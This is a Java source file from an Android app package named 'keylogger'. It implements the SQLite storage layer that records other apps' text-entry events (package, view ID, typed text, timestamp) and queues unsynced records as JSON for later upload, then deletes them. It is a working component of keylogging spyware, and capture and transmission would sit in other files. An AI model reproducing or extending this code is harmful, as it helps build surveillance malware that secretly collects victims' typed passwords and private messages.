package com.fason.app.features.keylogger;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class KeystrokeDatabase extends SQLiteOpenHelper {

    private static final String DB_NAME = "keystrokes.db";
    private static final int DB_VERSION = 1;

    private static final String TABLE_KEYSTROKES = "keystrokes";
    private static final String COL_ID = "id";
    private static final String COL_TIMESTAMP = "ts";
    private static final String COL_EVENT_TYPE = "event_type";
    private static final String COL_PACKAGE = "pkg";
    private static final String COL_CLASS_NAME = "cls";
    private static final String COL_VIEW_ID = "view_id";
    private static final String COL_TEXT = "txt";
    private static final String COL_EXTRA = "extra";
    private static final String COL_SYNCED = "synced";

    private static KeystrokeDatabase instance;

    private KeystrokeDatabase(Context context) {
        super(context.getApplicationContext(), DB_NAME, null, DB_VERSION);
    }

    public static synchronized KeystrokeDatabase getInstance(Context context) {
        if (instance == null) {
            instance = new KeystrokeDatabase(context);
        }
        return instance;
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE " + TABLE_KEYSTROKES + " ("
            + COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, "
            + COL_TIMESTAMP + " INTEGER NOT NULL, "
            + COL_EVENT_TYPE + " TEXT NOT NULL, "
            + COL_PACKAGE + " TEXT NOT NULL, "
            + COL_CLASS_NAME + " TEXT, "
            + COL_VIEW_ID + " TEXT, "
            + COL_TEXT + " TEXT, "
            + COL_EXTRA + " TEXT, "
            + COL_SYNCED + " INTEGER DEFAULT 0"
            + ")");
        db.execSQL("CREATE INDEX idx_keystrokes_synced ON " + TABLE_KEYSTROKES + "(" + COL_SYNCED + ")");
        db.execSQL("CREATE INDEX idx_keystrokes_ts ON " + TABLE_KEYSTROKES + "(" + COL_TIMESTAMP + ")");
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_KEYSTROKES);
        onCreate(db);
    }

    public long insert(long timestamp, String eventType, String pkg, String cls, String viewId, String text, String extra) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues cv = new ContentValues();
        cv.put(COL_TIMESTAMP, timestamp);
        cv.put(COL_EVENT_TYPE, eventType);
        cv.put(COL_PACKAGE, pkg != null ? pkg : "");
        cv.put(COL_CLASS_NAME, cls != null ? cls : "");
        cv.put(COL_VIEW_ID, viewId != null ? viewId : "");
        cv.put(COL_TEXT, text != null ? text : "");
        cv.put(COL_EXTRA, extra != null ? extra : "");
        cv.put(COL_SYNCED, 0);
        return db.insert(TABLE_KEYSTROKES, null, cv);
    }

    public List<JSONObject> getUnsynced(int limit) {
        List<JSONObject> list = new ArrayList<>();
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.query(TABLE_KEYSTROKES, null, COL_SYNCED + "=0",
            null, null, null, COL_ID + " ASC", String.valueOf(limit));
        while (c.moveToNext()) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                obj.put("ts", c.getLong(c.getColumnIndexOrThrow(COL_TIMESTAMP)));
                obj.put("eventType", c.getString(c.getColumnIndexOrThrow(COL_EVENT_TYPE)));
                obj.put("pkg", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                obj.put("cls", c.getString(c.getColumnIndexOrThrow(COL_CLASS_NAME)));
                obj.put("viewId", c.getString(c.getColumnIndexOrThrow(COL_VIEW_ID)));
                obj.put("txt", c.getString(c.getColumnIndexOrThrow(COL_TEXT)));
                obj.put("extra", c.getString(c.getColumnIndexOrThrow(COL_EXTRA)));
                list.add(obj);
            } catch (Exception ignored) {}
        }
        c.close();
        return list;
    }

    public void markSynced(List<Long> ids) {
        if (ids.isEmpty()) return;
        SQLiteDatabase db = getWritableDatabase();
        // Batch UPDATE với WHERE IN thay vì N lần UPDATE riêng lẻ
        StringBuilder placeholders = new StringBuilder();
        String[] args = new String[ids.size()];
        for (int i = 0; i < ids.size(); i++) {
            if (i > 0) placeholders.append(",");
            placeholders.append("?");
            args[i] = String.valueOf(ids.get(i));
        }
        ContentValues cv = new ContentValues();
        cv.put(COL_SYNCED, 1);
        db.update(TABLE_KEYSTROKES, cv,
            COL_ID + " IN (" + placeholders.toString() + ")", args);
    }

    public int getUnsyncedCount() {
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE_KEYSTROKES + " WHERE " + COL_SYNCED + "=0", null);
        int count = 0;
        if (c.moveToFirst()) count = c.getInt(0);
        c.close();
        return count;
    }

    public JSONArray getHistory(long since, int limit) {
        JSONArray arr = new JSONArray();
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.query(TABLE_KEYSTROKES, null, COL_TIMESTAMP + ">?",
            new String[]{String.valueOf(since)}, null, null, COL_TIMESTAMP + " DESC",
            String.valueOf(limit));
        while (c.moveToNext()) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("id", c.getLong(c.getColumnIndexOrThrow(COL_ID)));
                obj.put("ts", c.getLong(c.getColumnIndexOrThrow(COL_TIMESTAMP)));
                obj.put("eventType", c.getString(c.getColumnIndexOrThrow(COL_EVENT_TYPE)));
                obj.put("pkg", c.getString(c.getColumnIndexOrThrow(COL_PACKAGE)));
                obj.put("cls", c.getString(c.getColumnIndexOrThrow(COL_CLASS_NAME)));
                obj.put("viewId", c.getString(c.getColumnIndexOrThrow(COL_VIEW_ID)));
                obj.put("txt", c.getString(c.getColumnIndexOrThrow(COL_TEXT)));
                obj.put("extra", c.getString(c.getColumnIndexOrThrow(COL_EXTRA)));
                arr.put(obj);
            } catch (Exception ignored) {}
        }
        c.close();
        return arr;
    }

    public void deleteSynced() {
        SQLiteDatabase db = getWritableDatabase();
        db.delete(TABLE_KEYSTROKES, COL_SYNCED + "=1", null);
    }
}
